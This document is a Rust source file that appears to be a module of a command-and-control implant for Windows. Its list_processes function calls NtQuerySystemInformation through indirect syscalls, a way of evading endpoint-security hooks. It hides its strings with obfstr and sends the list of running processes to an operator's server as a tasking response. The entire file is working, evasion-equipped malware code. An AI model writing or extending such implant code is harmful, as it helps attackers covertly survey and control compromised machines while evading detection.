use callghost::syscall;
use std::slice;
use winapi::shared::{
    ntdef::{PVOID, ULONG, UNICODE_STRING, LARGE_INTEGER},
};
use serde_json::Value;
use obfstr::obfstr;

const SystemProcessInformation: u32 = 5;
const BUFFER_SIZE: usize = 0x100000;

#[repr(C)]
struct SYSTEM_THREAD_INFORMATION {
    Reserved1: [LARGE_INTEGER; 3],
    Reserved2: [usize; 2],
    StartAddress: PVOID,
    ClientId: [PVOID; 2],
    Priority: LONG,
    BasePriority: LONG,
    ContextSwitches: ULONG,
    ThreadState: ULONG,
    WaitReason: ULONG,
}

#[repr(C)]
struct SYSTEM_PROCESS_INFORMATION {
    NextEntryOffset: ULONG,
    NumberOfThreads: ULONG,
    WorkingSetPrivateSize: LARGE_INTEGER,
    HardFaultCount: ULONG,
    NumberOfThreadsHighWatermark: ULONG,
    CycleTime: u64,
    CreateTime: LARGE_INTEGER,
    UserTime: LARGE_INTEGER,
    KernelTime: LARGE_INTEGER,
    ImageName: UNICODE_STRING,
    BasePriority: KPRIORITY,
    UniqueProcessId: PVOID,
    InheritedFromUniqueProcessId: PVOID,
    HandleCount: ULONG,
    SessionId: ULONG,
    UniqueProcessKey: usize,
    PeakVirtualSize: usize,
    VirtualSize: usize,
    PageFaultCount: ULONG,
    PeakWorkingSetSize: usize,
    WorkingSetSize: usize,
    QuotaPeakPagedPoolUsage: usize,
    QuotaPagedPoolUsage: usize,
    QuotaPeakNonPagedPoolUsage: usize,
    QuotaNonPagedPoolUsage: usize,
    PagefileUsage: usize,
    PeakPagefileUsage: usize,
    PrivatePageCount: usize,
    ReadOperationCount: i64,
    WriteOperationCount: i64,
    OtherOperationCount: i64,
    ReadTransferCount: i64,
    WriteTransferCount: i64,
    OtherTransferCount: i64,
    Threads: [SYSTEM_THREAD_INFORMATION; 1],
}

type LONG = i32;
type KPRIORITY = LONG;

pub fn list_processes(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
    let mut output = String::new();

    unsafe {
        let mut buffer = vec![0u8; BUFFER_SIZE];
        let mut return_len: ULONG = 0;

        let status = syscall!(
            indirect,
            NtQuerySystemInformation,
            SystemProcessInformation,
            buffer.as_mut_ptr(),
            BUFFER_SIZE as u32,
            &mut return_len
        );

        if status != 0 {
            output.push_str(&format!(
                "[!] NtQuerySystemInformation failed: 0x{:X}\n",
                status as u32
            ));
        } else {
            let mut offset = 0;
            while offset < return_len as usize {
                let proc_info = buffer.as_ptr().add(offset) as *const SYSTEM_PROCESS_INFORMATION;

                let pid = (*proc_info).UniqueProcessId as usize;
                let name = if (*proc_info).ImageName.Length > 0 {
                    let name_slice = slice::from_raw_parts(
                        (*proc_info).ImageName.Buffer,
                        (*proc_info).ImageName.Length as usize / 2,
                    );
                    String::from_utf16_lossy(name_slice)
                } else {
                    String::from("System Idle Process")
                };

                output.push_str(&format!("[{}] {}\n", pid, name));

                if (*proc_info).NextEntryOffset == 0 {
                    break;
                }

                offset += (*proc_info).NextEntryOffset as usize;
            }
        }
    }
    crate::helpers::churn(output.as_str());

    let response_json = serde_json::json!({
        obfstr!("action"): obfstr!("post_response"),
        obfstr!("responses"): [
            {
                obfstr!("task_id"): task.get("id").unwrap().as_str().unwrap(),
                obfstr!("user_output"): output,
                obfstr!("timestamp"): task.get(obfstr!("timestamp")).unwrap().as_f64().unwrap(),
                obfstr!("status"): obfstr!("success"),
                obfstr!("completed"): true,
            }
        ]
    });

    let response_value = serde_json::to_string(&response_json)?;
    crate::transport::send_request(&response_value)?;
    Ok(())
}
